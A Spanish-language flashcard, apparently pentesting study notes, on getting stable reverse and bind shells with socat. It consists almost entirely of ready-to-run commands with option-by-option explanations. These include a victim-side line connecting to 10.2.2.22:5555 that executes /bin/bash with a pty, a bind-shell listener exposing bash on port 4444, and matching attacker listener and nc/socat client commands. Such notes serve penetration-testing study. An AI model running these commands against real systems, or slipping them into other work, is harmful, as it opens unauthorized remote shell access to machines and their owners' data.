**Flashcard: Socat – Reverse Shell y Bind Shell (técnica estable)**

---

**Reverse Shell (atacante escucha, víctima conecta)**

**Atacante (listener interactivo con pty – recomendado)**

```bash
socat -d -d TCP-LISTEN:5555,reuseaddr,fork FILE:`tty`,raw,echo=0
```

* `TCP-LISTEN:5555` → escucha en puerto 5555.
* `reuseaddr` → reutiliza puerto inmediatamente.
* `fork` → permite múltiples conexiones.
* `FILE:\`tty\`,raw,echo=0\` → enlaza socket a tu terminal actual en modo raw (interactivo).

**Víctima**

```bash
socat TCP:10.2.2.22:5555 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

* `TCP:<IP_ATACANTE>:<PUERTO>` → conecta al atacante.
* `EXEC:/bin/bash` → lanza bash.
* `pty` → asigna pseudo-terminal para estabilidad.
* `stderr` → redirige errores al canal.
* `setsid` → nueva sesión de terminal.
* `sigint` → permite enviar CTRL+C.
* `sane` → configura terminal a estado usable.

---

**Bind Shell (víctima escucha, atacante conecta)**

**Víctima (listener)**

```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

* Escucha en puerto 4444.
* Ejecuta bash con pseudo-terminal y manejo de señales.

**Atacante (cliente)**

```bash
nc <IP_VICTIMA> 4444
```

o también:

```bash
socat TCP:<IP_VICTIMA>:4444 -
```

---

**Notas clave**

* Puertos <1024 requieren root.
* `pty` es fundamental para que la shell sea interactiva.
* En reverse shell, el listener **no** ejecuta bash, solo redirige al terminal local.
* En bind shell, quien ejecuta bash es el listener (víctima).
* `socat` produce shells más estables que `netcat`.
